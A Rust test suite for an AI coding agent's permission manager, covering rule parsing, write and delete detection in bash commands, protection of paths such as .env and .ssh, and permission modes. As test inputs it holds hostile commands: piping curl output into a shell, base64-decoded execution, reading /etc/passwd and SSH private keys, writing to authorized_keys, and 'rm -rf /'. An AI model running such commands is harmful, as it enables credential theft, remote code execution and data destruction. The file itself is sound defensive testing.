#[allow(unused)]
type Result<T> = core::result::Result<T, Box<dyn std::error::Error>>; // For tests.

use super::*;
use serde_json::json;

// -- PermissionRule::parse

#[test]
fn parse_empty_returns_none() -> Result<()> {
    // -- Exec & Check
    assert!(PermissionRule::parse("").is_none());
    assert!(PermissionRule::parse("   ").is_none());
    Ok(())
}

#[test]
fn parse_bare_tool() -> Result<()> {
    // -- Exec
    let rule = PermissionRule::parse("Bash").ok_or("expected rule")?;

    // -- Check
    assert_eq!(rule.tool, "bash");
    assert_eq!(rule.pattern, None);
    Ok(())
}

#[test]
fn parse_tool_with_exact_arg() -> Result<()> {
    // -- Setup & Fixtures
    let input = "Bash(cargo test)";

    // -- Exec
    let rule = PermissionRule::parse(input).ok_or("expected rule")?;

    // -- Check
    assert_eq!(rule.tool, "bash");
    assert_eq!(rule.pattern.as_deref(), Some("cargo test"));
    Ok(())
}

#[test]
fn parse_tool_with_prefix_wildcard() -> Result<()> {
    let r = PermissionRule::parse("Bash(rm -rf:*)").ok_or("Should parse")?;
    assert_eq!(r.tool, "bash");
    assert_eq!(r.pattern.as_deref(), Some("rm -rf:*"));

    Ok(())
}

#[test]
fn parse_tool_with_path_glob() -> Result<()> {
    let r = PermissionRule::parse("Read(src/**)").ok_or("Should parse")?;
    assert_eq!(r.tool, "read");
    assert_eq!(r.pattern.as_deref(), Some("src/**"));

    Ok(())
}

#[test]
fn parse_case_insensitive_tool_name() -> Result<()> {
    let r = PermissionRule::parse("WRITE_FILE").ok_or("Should parse")?;
    assert_eq!(r.tool, "write_file");

    Ok(())
}

#[test]
fn parse_empty_parens() -> Result<()> {
    let r = PermissionRule::parse("Bash()").ok_or("Should parse")?;
    assert_eq!(r.tool, "bash");
    assert_eq!(r.pattern, None);

    Ok(())
}

// -- PermissionRule::matches

#[test]
fn matches_bare_tool_all_args() -> Result<()> {
    let r = PermissionRule::parse("bash").ok_or("Should parse")?;
    assert!(r.matches("bash", Some("anything")));
    assert!(r.matches("bash", None));
    assert!(r.matches("BASH", Some("x"))); // tool comparison is case-insensitive

    Ok(())
}

#[test]
fn matches_exact_arg() -> Result<()> {
    let r = PermissionRule::parse("Bash(cargo test)").ok_or("Should parse")?;
    assert!(r.matches("bash", Some("cargo test")));
    assert!(!r.matches("bash", Some("cargo build")));
    assert!(!r.matches("bash", None));

    Ok(())
}

#[test]
fn matches_prefix_wildcard() -> Result<()> {
    let r = PermissionRule::parse("Bash(rm -rf:*)").ok_or("Should parse")?;
    assert!(r.matches("bash", Some("rm -rf /tmp/foo")));
    assert!(r.matches("bash", Some("rm -rf")));
    assert!(!r.matches("bash", Some("rm foo")));

    Ok(())
}

#[test]
fn matches_path_glob() -> Result<()> {
    let r = PermissionRule::parse("Read(src/**)").ok_or("Should parse")?;
    assert!(r.matches("read", Some("src/main.rs")));
    assert!(r.matches("read", Some("src/lib/utils.rs")));
    assert!(r.matches("read", Some("src"))); // exact match on base
    assert!(!r.matches("read", Some("tests/main.rs")));

    Ok(())
}

#[test]
fn matches_double_star_pattern() -> Result<()> {
    let r = PermissionRule::parse("Read(**)").ok_or("Should parse")?;
    assert!(r.matches("read", Some("anything/at/all")));

    Ok(())
}

#[test]
fn wrong_tool_never_matches() -> Result<()> {
    let r = PermissionRule::parse("bash").ok_or("Should parse")?;
    assert!(!r.matches("read_file", Some("foo")));

    Ok(())
}

// -- PermissionRule::Display

#[test]
fn display_bare() -> Result<()> {
    let r = PermissionRule::parse("bash").ok_or("Should parse")?;
    assert_eq!(r.to_string(), "bash");

    Ok(())
}

#[test]
fn display_with_pattern() -> Result<()> {
    let r = PermissionRule::parse("Bash(cargo test)").ok_or("Should parse")?;
    assert_eq!(r.to_string(), "bash(cargo test)");

    Ok(())
}

// -- tool_first_arg

#[test]
fn tool_first_arg_bash_command() {
    let args = json!({"command": "ls -la"});
    assert_eq!(tool_first_arg("bash", &args).as_deref(), Some("ls -la"));
}

#[test]
fn tool_first_arg_read_file_path() {
    let args = json!({"path": "src/main.rs"});
    assert_eq!(
        tool_first_arg("read_file", &args).as_deref(),
        Some("src/main.rs")
    );
}

#[test]
fn tool_first_arg_unknown_tool_checks_common_keys() {
    let args = json!({"query": "search term"});
    assert_eq!(
        tool_first_arg("custom_tool", &args).as_deref(),
        Some("search term")
    );
}

#[test]
fn tool_first_arg_no_matching_key() {
    let args = json!({"foo": "bar"});
    assert!(tool_first_arg("bash", &args).is_none());
}

// -- PermissionMode

#[test]
fn permission_mode_default() {
    assert_eq!(PermissionMode::default(), PermissionMode::Default);
}

#[test]
fn permission_mode_roundtrip() -> Result<()> {
    for mode_str in &["default", "acceptEdits", "plan", "bypassPermissions"] {
        let mode: PermissionMode = mode_str.parse()?;
        assert_eq!(mode.to_string(), *mode_str);
    }

    Ok(())
}

#[test]
fn permission_mode_invalid() {
    assert!("garbage".parse::<PermissionMode>().is_err());
}

// -- bash_command_is_write

#[test]
fn readonly_commands_not_write() {
    assert!(!bash_command_is_write("ls -la"));
    assert!(!bash_command_is_write("cat src/main.rs"));
    assert!(!bash_command_is_write("grep -rn foo ."));
    assert!(!bash_command_is_write("git status"));
    assert!(!bash_command_is_write("git log --oneline"));
    assert!(!bash_command_is_write("cargo test"));
    assert!(!bash_command_is_write("cargo clippy"));
    assert!(!bash_command_is_write("pwd"));
    assert!(!bash_command_is_write("echo hello"));
}

#[test]
fn write_commands_detected() {
    assert!(bash_command_is_write("rm -rf target"));
    assert!(bash_command_is_write("cp foo bar"));
    assert!(bash_command_is_write("mv foo bar"));
    assert!(bash_command_is_write("mkdir -p src"));
    assert!(bash_command_is_write("touch new_file"));
}

#[test]
fn redirect_is_write() {
    assert!(bash_command_is_write("echo foo > file.txt"));
    assert!(bash_command_is_write("cat foo >> bar.txt"));
}

#[test]
fn pipe_segments_checked() {
    // ls is read-only, but piped to tee (unknown = write) is caught
    assert!(bash_command_is_write("ls | tee output.txt"));
}

#[test]
fn git_write_subcommands() {
    assert!(bash_command_is_write("git commit -m 'msg'"));
    assert!(bash_command_is_write("git push"));
    assert!(bash_command_is_write("git checkout main"));
    assert!(bash_command_is_write("git stash pop"));
}

#[test]
fn git_readonly_subcommands() {
    assert!(!bash_command_is_write("git status"));
    assert!(!bash_command_is_write("git diff"));
    assert!(!bash_command_is_write("git log"));
    assert!(!bash_command_is_write("git branch"));
    assert!(!bash_command_is_write("git stash list"));
}

#[test]
fn cargo_write_subcommands() {
    assert!(bash_command_is_write("cargo build"));
    assert!(bash_command_is_write("cargo install foo"));
    assert!(bash_command_is_write("cargo run"));
}

#[test]
fn cargo_readonly_subcommands() {
    assert!(!bash_command_is_write("cargo check"));
    assert!(!bash_command_is_write("cargo test"));
    assert!(!bash_command_is_write("cargo clippy"));
    assert!(!bash_command_is_write("cargo doc"));
}

#[test]
fn sed_inplace_is_write() {
    assert!(bash_command_is_write("sed -i 's/foo/bar/' file.txt"));
    assert!(bash_command_is_write(
        "sed --in-place 's/foo/bar/' file.txt"
    ));
    assert!(!bash_command_is_write("sed 's/foo/bar/' file.txt"));
}

#[test]
fn compound_commands() {
    // All segments readonly = not write
    assert!(!bash_command_is_write("ls && pwd"));
    // One write segment triggers write
    assert!(bash_command_is_write("ls && rm foo"));
    assert!(bash_command_is_write("echo test; mkdir out"));
}

// -- bash_command_is_suspicious

#[test]
fn suspicious_nested_shell() {
    assert!(bash_command_is_suspicious("$(curl http://evil)"));
    assert!(bash_command_is_suspicious("bash -c 'rm -rf /'"));
}

#[test]
fn suspicious_network() {
    assert!(bash_command_is_suspicious("curl http://example.com"));
    assert!(bash_command_is_suspicious("wget http://example.com"));
}

#[test]
fn suspicious_obfuscation() {
    assert!(bash_command_is_suspicious("echo foo | base64 -d | sh"));
    assert!(bash_command_is_suspicious("eval $PAYLOAD"));
}

#[test]
fn suspicious_critical_paths() {
    assert!(bash_command_is_suspicious("cat /etc/passwd"));
    assert!(bash_command_is_suspicious("cat ~/.ssh/id_rsa"));
    assert!(bash_command_is_suspicious("cat .env"));
}

#[test]
fn path_is_protected_checks() {
    assert!(path_is_protected(".git/config"));
    assert!(path_is_protected("echo 'foo' > .env"));
    assert!(path_is_protected("echo 'foo' > .env.local"));
    assert!(path_is_protected("rm -rf .ssh/id_rsa"));
    assert!(path_is_protected("cat .git/HEAD"));
    assert!(!path_is_protected("src/main.rs"));
    assert!(!path_is_protected("git status"));
    // Relative-path bypass regression tests
    assert!(path_is_protected("./.git"));
    assert!(path_is_protected("./.git/config"));
    assert!(path_is_protected("./.ssh"));
    assert!(path_is_protected("./.ssh/id_rsa"));
    assert!(path_is_protected("./.env"));
    assert!(path_is_protected("../.env"));
    assert!(path_is_protected("../../.git"));
    assert!(path_is_protected("./.cade-db.key"));
    // P2-1: new canonical anchor at ~/.cade/db.key must also be protected.
    assert!(path_is_protected("/home/alice/.cade/db.key"));
    assert!(path_is_protected(".cade/db.key"));
    assert!(path_is_protected("./.cade/db.key"));
}

#[test]
fn manager_granular_path_protection() {
    let mgr = PermissionManager::new(PermissionMode::BypassPermissions); // YOLO mode

    // Write to .env should be denied
    let args = json!({"path": ".env"});
    assert!(mgr.resolve("write_file", &args, false).is_deny());

    // Write to .git should be denied
    let args = json!({"path": ".git/config"});
    assert!(mgr.resolve("edit_file", &args, false).is_deny());

    // Read from .env should NOT be denied
    let args = json!({"path": ".env"});
    assert!(mgr.resolve("read_file", &args, false).is_allow());

    // Bash write to .ssh should be denied
    let args = json!({"command": "echo 'key' > ~/.ssh/authorized_keys"});
    assert!(mgr.resolve("bash", &args, false).is_deny());

    // Bash read from .git should NOT be denied
    let args = json!({"command": "cat .git/HEAD"});
    assert!(mgr.resolve("bash", &args, false).is_allow());
}

#[test]
fn non_suspicious_commands() {
    assert!(!bash_command_is_suspicious("ls -la"));
    assert!(!bash_command_is_suspicious("cargo test"));
    assert!(!bash_command_is_suspicious("git status"));
}

// -- PermissionManager

#[test]
fn manager_session_allow_deduplicates() {
    let mgr = PermissionManager::new(PermissionMode::Default);
    mgr.add_session_allow("Bash(cargo test)");
    mgr.add_session_allow("Bash(cargo test)");
    assert_eq!(mgr.allow_rules().len(), 1);
}

#[test]
fn manager_session_allow_invalid_ignored() {
    let mgr = PermissionManager::new(PermissionMode::Default);
    mgr.add_session_allow("");
    assert!(mgr.allow_rules().is_empty());
}

#[test]
fn manager_mode_change() {
    let mgr = PermissionManager::new(PermissionMode::Default);
    assert_eq!(mgr.mode(), PermissionMode::Default);
    mgr.set_mode(PermissionMode::Plan);
    assert_eq!(mgr.mode(), PermissionMode::Plan);
}

// -- Verdict enum

#[test]
fn verdict_is_allow() {
    assert!(Verdict::Allow.is_allow());
    assert!(!Verdict::Allow.is_ask());
    assert!(!Verdict::Allow.is_deny());
    assert!(Verdict::Allow.reason().is_none());
}

#[test]
fn verdict_is_ask() {
    let v = Verdict::Ask("reason".into());
    assert!(!v.is_allow());
    assert!(v.is_ask());
    assert!(!v.is_deny());
    assert_eq!(v.reason(), Some("reason"));
}

#[test]
fn verdict_is_deny() {
    let v = Verdict::Deny("blocked".into());
    assert!(!v.is_allow());
    assert!(!v.is_ask());
    assert!(v.is_deny());
    assert_eq!(v.reason(), Some("blocked"));
}

// -- is_write_schema

#[test]
fn write_schemas_detected() {
    assert!(is_write_schema("write_file"));
    assert!(is_write_schema("edit_file"));
    assert!(is_write_schema("delete_file"));
    assert!(is_write_schema("apply_patch"));
    assert!(is_write_schema("edit_block"));
    assert!(is_write_schema("desktop_control"));
}

#[test]
fn read_schemas_not_write() {
    assert!(!is_write_schema("read_file"));
    assert!(!is_write_schema("grep"));
    assert!(!is_write_schema("glob"));
    assert!(!is_write_schema("bash")); // bash is not inherently write at schema level
}

// -- bash_first_cmd_is_delete

#[test]
fn bash_delete_commands_detected() {
    assert!(bash_first_cmd_is_delete("rm -rf target"));
    assert!(bash_first_cmd_is_delete("rmdir empty_dir"));
    assert!(bash_first_cmd_is_delete("unlink file.txt"));
    assert!(bash_first_cmd_is_delete("shred secret.key"));
}

#[test]
fn bash_non_delete_commands_not_detected() {
    assert!(!bash_first_cmd_is_delete("ls -la"));
    assert!(!bash_first_cmd_is_delete("cp foo bar"));
    assert!(!bash_first_cmd_is_delete("mv foo bar"));
    assert!(!bash_first_cmd_is_delete("mkdir new_dir"));
    assert!(!bash_first_cmd_is_delete("touch new_file"));
}

#[test]
fn bash_delete_in_compound_command() {
    assert!(bash_first_cmd_is_delete("ls && rm foo"));
    assert!(bash_first_cmd_is_delete("echo done; rmdir out"));
}

// -- is_delete_action

#[test]
fn delete_action_native_tool() {
    assert!(is_delete_action(
        "delete_file",
        "delete_file",
        &json!({"path": "f"}),
        false
    ));
}

#[test]
fn delete_action_mcp_tool() {
    assert!(is_delete_action(
        "desktop-commander__delete_file",
        "delete_file",
        &json!({"path": "f"}),
        true,
    ));
    assert!(is_delete_action(
        "desktop-commander__remove_directory",
        "remove_directory",
        &json!({"path": "d"}),
        true,
    ));
}

#[test]
fn delete_action_mcp_write_not_delete() {
    // MCP write tool that is NOT a delete
    assert!(!is_delete_action(
        "desktop-commander__write_file",
        "write_file",
        &json!({"path": "f"}),
        true,
    ));
}

#[test]
fn delete_action_bash_rm() {
    assert!(is_delete_action(
        "bash",
        "bash",
        &json!({"command": "rm -rf target"}),
        false,
    ));
}

#[test]
fn delete_action_bash_non_delete() {
    assert!(!is_delete_action(
        "bash",
        "bash",
        &json!({"command": "cp foo bar"}),
        false,
    ));
}

// -- resolve()

#[test]
fn resolve_plan_mode_denies_write_tools() {
    let mgr = PermissionManager::new(PermissionMode::Plan);
    assert!(
        mgr.resolve("write_file", &json!({"path": "f.rs"}), false)
            .is_deny()
    );
    assert!(
        mgr.resolve("edit_file", &json!({"path": "f.rs"}), false)
            .is_deny()
    );
    assert!(
        mgr.resolve("delete_file", &json!({"path": "f.rs"}), false)
            .is_deny()
    );
    assert!(
        mgr.resolve("apply_patch", &json!({"path": "f.rs"}), false)
            .is_deny()
    );
}

#[test]
fn resolve_plan_mode_overrides_allow_rule_for_mutations() {
    let mgr = PermissionManager::new(PermissionMode::Plan);
    mgr.add_allow_rule(PermissionRule::parse("write_file").unwrap());
    // Even though write_file is explicitly allowed, Plan mode must deny it.
    assert!(
        mgr.resolve("write_file", &json!({"path": "f.rs"}), false)
            .is_deny()
    );
}

#[test]
fn resolve_plan_mode_allows_reads() {
    let mgr = PermissionManager::new(PermissionMode::Plan);
    assert!(
        mgr.resolve("read_file", &json!({"path": "f.rs"}), false)
            .is_allow()
    );
    assert!(
        mgr.resolve("grep", &json!({"pattern": "foo"}), false)
            .is_allow()
    );
    assert!(
        mgr.resolve("glob", &json!({"pattern": "*.rs"}), false)
            .is_allow()
    );
}

#[test]
fn resolve_plan_mode_allows_readonly_bash() {
    let mgr = PermissionManager::new(PermissionMode::Plan);
    assert!(
        mgr.resolve("bash", &json!({"command": "ls -la"}), false)
            .is_allow()
    );
    assert!(
        mgr.resolve("bash", &json!({"command": "cargo test"}), false)
            .is_allow()
    );
}

#[test]
fn resolve_plan_mode_denies_write_bash() {
    let mgr = PermissionManager::new(PermissionMode::Plan);
    assert!(
        mgr.resolve("bash", &json!({"command": "rm -rf target"}), false)
            .is_deny()
    );
    assert!(
        mgr.resolve("bash", &json!({"command": "mkdir out"}), false)
            .is_deny()
    );
}

#[test]
fn resolve_accept_edits_allows_write_tools() {
    let mgr = PermissionManager::new(PermissionMode::AcceptEdits);
    assert!(
        mgr.resolve("write_file", &json!({"path": "f.rs"}), false)
            .is_allow()
    );
    assert!(
        mgr.resolve("edit_file", &json!({"path": "f.rs"}), false)
            .is_allow()
    );
    assert!(
        mgr.resolve("apply_patch", &json!({"path": "f.rs"}), false)
            .is_allow()
    );
    assert!(
        mgr.resolve("edit_block", &json!({"path": "f.rs"}), false)
            .is_allow()
    );
}

#[test]
fn resolve_accept_edits_asks_for_delete() {
    let mgr = PermissionManager::new(PermissionMode::AcceptEdits);
    assert!(
        mgr.resolve("delete_file", &json!({"path": "f.rs"}), false)
            .is_ask()
    );
}

#[test]
fn resolve_accept_edits_asks_for_mcp_delete() {
    let mgr = PermissionManager::new(PermissionMode::AcceptEdits);
    assert!(
        mgr.resolve(
            "desktop-commander__delete_file",
            &json!({"path": "f"}),
            true,
        )
        .is_ask()
    );
}

#[test]
fn resolve_accept_edits_asks_for_bash_rm() {
    let mgr = PermissionManager::new(PermissionMode::AcceptEdits);
    assert!(
        mgr.resolve("bash", &json!({"command": "rm -rf target"}), false)
            .is_ask()
    );
}

#[test]
fn resolve_accept_edits_allows_bash_write_non_delete() {
    let mgr = PermissionManager::new(PermissionMode::AcceptEdits);
    // cp, mv, mkdir are writes but not deletes — auto-approved
    assert!(
        mgr.resolve("bash", &json!({"command": "cp foo bar"}), false)
            .is_allow()
    );
}

#[test]
fn resolve_accept_edits_allows_mcp_write_non_delete() {
    let mgr = PermissionManager::new(PermissionMode::AcceptEdits);
    assert!(
        mgr.resolve("desktop-commander__write_file", &json!({"path": "f"}), true,)
            .is_allow()
    );
}

#[test]
fn resolve_default_mode_asks_for_writes() {
    let mgr = PermissionManager::new(PermissionMode::Default);
    assert!(
        mgr.resolve("write_file", &json!({"path": "f.rs"}), false)
            .is_ask()
    );
    assert!(
        mgr.resolve("bash", &json!({"command": "rm foo"}), false)
            .is_ask()
    );
}

#[test]
fn resolve_default_mode_allows_reads() {
    let mgr = PermissionManager::new(PermissionMode::Default);
    assert!(
        mgr.resolve("read_file", &json!({"path": "f.rs"}), false)
            .is_allow()
    );
    assert!(
        mgr.resolve("bash", &json!({"command": "ls"}), false)
            .is_allow()
    );
}

#[test]
fn resolve_bypass_allows_everything() {
    let mgr = PermissionManager::new(PermissionMode::BypassPermissions);
    assert!(
        mgr.resolve("bash", &json!({"command": "rm -rf /"}), false)
            .is_allow()
    );
    assert!(
        mgr.resolve("write_file", &json!({"path": "f"}), false)
            .is_allow()
    );
    assert!(
        mgr.resolve("delete_file", &json!({"path": "f"}), false)
            .is_allow()
    );
}

#[test]
fn resolve_protected_path_denies_write() {
    let mgr = PermissionManager::new(PermissionMode::BypassPermissions);
    assert!(
        mgr.resolve("write_file", &json!({"path": ".env"}), false)
            .is_deny()
    );
    assert!(
        mgr.resolve("edit_file", &json!({"path": ".git/config"}), false)
            .is_deny()
    );
}

#[test]
fn resolve_deny_rule_overrides() {
    let mgr = PermissionManager::new(PermissionMode::BypassPermissions);
    mgr.add_deny_rule(PermissionRule::parse("Bash(rm -rf:*)").unwrap());
    assert!(
        mgr.resolve("bash", &json!({"command": "rm -rf /tmp"}), false)
            .is_deny()
    );
}

#[test]
fn resolve_allow_rule_approves() {
    let mgr = PermissionManager::new(PermissionMode::Default);
    mgr.add_allow_rule(PermissionRule::parse("Bash(cargo test)").unwrap());
    assert!(
        mgr.resolve("bash", &json!({"command": "cargo test"}), false)
            .is_allow()
    );
}

#[test]
fn resolve_strict_bash_overrides_allow_rule() {
    let mgr = PermissionManager::new_with_strict_bash(PermissionMode::Default, true);
    mgr.add_allow_rule(PermissionRule::parse("bash").unwrap());
    assert!(
        mgr.resolve("bash", &json!({"command": "ls"}), false)
            .is_ask()
    );
}

#[test]
fn resolve_config_edit_protection() {
    let mgr = PermissionManager::new(PermissionMode::BypassPermissions);
    assert!(
        mgr.resolve("write_file", &json!({"path": ".cade/settings.json"}), false)
            .is_ask()
    );
    assert!(
        mgr.resolve("edit_file", &json!({"path": "settings.local.json"}), false)
            .is_ask()
    );
    assert!(
        mgr.resolve(
            "write_file",
            &json!({"path": ".cade/skills/hack/SKILL.MD"}),
            false
        )
        .is_ask()
    );
}

// -- Bug 1: subagent permission inheritance (default asks, bypass allows)
//
// This proves the pre-fix behavior was broken: PermissionManager::default()
// returns Verdict::Ask for write_file, which headless mode treats as Deny.
// The fix uses PermissionManager::new(parent.mode()) instead.

#[test]
fn default_mode_asks_for_write_file() {
    let mgr = PermissionManager::default();
    let args = json!({"path": "foo.rs", "content": "bar"});
    assert!(
        mgr.resolve("write_file", &args, false).is_ask(),
        "default mode should Ask for write_file (headless would deny)"
    );
}

#[test]
fn bypass_mode_allows_write_file() {
    let mgr = PermissionManager::new(PermissionMode::BypassPermissions);
    let args = json!({"path": "foo.rs", "content": "bar"});
    assert!(
        mgr.resolve("write_file", &args, false).is_allow(),
        "bypassPermissions mode should Allow write_file"
    );
}

#[test]
fn accept_edits_mode_allows_write_file() {
    let mgr = PermissionManager::new(PermissionMode::AcceptEdits);
    let args = json!({"path": "foo.rs", "content": "bar"});
    assert!(
        mgr.resolve("write_file", &args, false).is_allow(),
        "acceptEdits mode should Allow write_file"
    );
}

#[test]
fn accept_edits_mode_asks_for_bash() {
    let mgr = PermissionManager::new(PermissionMode::AcceptEdits);
    let args = json!({"command": "rm -rf /tmp/foo"});
    assert!(
        mgr.resolve("bash", &args, false).is_ask(),
        "acceptEdits mode should Ask for bash (only file edits are auto-approved)"
    );
}
